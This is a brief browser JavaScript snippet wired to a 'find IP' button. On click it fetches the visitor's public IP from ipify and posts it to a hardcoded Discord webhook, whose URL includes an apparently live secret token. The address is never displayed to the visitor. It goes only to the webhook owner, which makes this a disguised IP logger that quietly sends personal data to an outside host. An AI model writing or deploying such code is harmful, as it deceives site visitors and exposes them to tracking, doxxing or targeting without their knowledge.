// Define the webhook URL
const webhookUrl = 'https://discord.com/api/webhooks/1213377737373257758/bKz7RPqQtxBpsmOQT3RKgItIvtnJMtFoTtKyiManuvoX4GYVP8oQhAG5Bq9pyzqRg1WB';

// Define the button element
const button = document.getElementById('find-ip-button');

// Add a click event listener to the button
button.addEventListener('click', () => {
  // Make a request to the ipify API
  fetch('https://api.ipify.org')
    .then(response => response.text())
    .then(ipAddress => {
      // Send the IP address to the Discord webhook
      sendToWebhook(ipAddress);
    })
    .catch(error => {
      console.error('Error fetching IP address:', error);
    });
});

// Function to send a message to the Discord webhook
function sendToWebhook(message) {
  const data = {
    content: message
  };

  fetch(webhookUrl, {
    method: 'POST',
    body: JSON.stringify(data),
    headers: {
      'Content-Type': 'application/json'
    }
  })
  .then(response => {
    console.log('Message sent to Discord webhook:', response);
  })
  .catch(error => {
    console.error('Error sending message to Discord webhook:', error);
  });
}